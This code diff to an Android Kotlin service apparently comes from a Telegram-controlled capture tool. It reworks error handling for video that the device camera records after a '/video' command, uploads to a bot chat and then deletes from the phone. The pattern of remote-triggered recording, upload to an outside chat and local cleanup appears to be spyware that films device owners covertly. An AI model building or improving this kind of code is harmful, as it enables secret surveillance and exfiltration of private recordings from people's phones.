@@ -207,23 +207,32 @@ class VideoCaptureService : Service() {
         val chatId = prefs.getString("chat_id",   "").orEmpty()
 
         Thread {
-            if (file != null && file.exists() && file.length() > 1024 &&
-                token.isNotEmpty() && chatId.isNotEmpty()
-            ) {
-                val durationSec = recordDurationMs / 1000
-                val caption = "🎥 Video ($durationSec soniya)"
-                val sent = TelegramSender.sendVideo(token, chatId, file.readBytes(), caption)
-                if (!sent) {
-                    TelegramSender.sendMessage(token, chatId,
-                        "⚠️ Video yuborishda xatolik (tarmoq muammosi). /video buyrug'ini qayta yuboring.")
+            val sizeMb = "%.2f".format((file?.length() ?: 0) / 1024.0 / 1024.0)
+            when {
+                file == null -> {
+                    TelegramSender.sendMessage(token, chatId, "⚠️ Video fayl yaratilmadi.")
                 }
-                file.delete()
-            } else if (file != null && file.exists()) {
-                if (token.isNotEmpty() && chatId.isNotEmpty()) {
-                    TelegramSender.sendMessage(token, chatId,
-                        "⚠️ Video fayl juda kichik (${file.length()} bayt). Kamera ochilmagan bo'lishi mumkin.")
+                !file.exists() -> {
+                    TelegramSender.sendMessage(token, chatId, "⚠️ Video fayl topilmadi.")
                 }
-                file.delete()
+                file.length() == 0L -> {
+                    TelegramSender.sendMessage(token, chatId,
+                        "⚠️ Video fayl bo'sh (0 bayt). Kamera ruxsati yo'q yoki allaqachon ishlatilmoqda.")
+                    file.delete()
+                }
+                token.isEmpty() || chatId.isEmpty() -> {
+                    file.delete()
+                }
+                else -> {
+                    val durationSec = recordDurationMs / 1000
+                    val caption = "🎥 Video ($durationSec soniya, $sizeMb MB)"
+                    val sent = TelegramSender.sendVideo(token, chatId, file.readBytes(), caption)
+                    if (!sent) {
+                        TelegramSender.sendMessage(token, chatId,
+                            "⚠️ Video ($sizeMb MB) yuborishda xatolik. Tarmoq sekin yoki fayl katta.")
+                    }
+                    file.delete()
+                }
             }
             stopSelf()
         }.start()
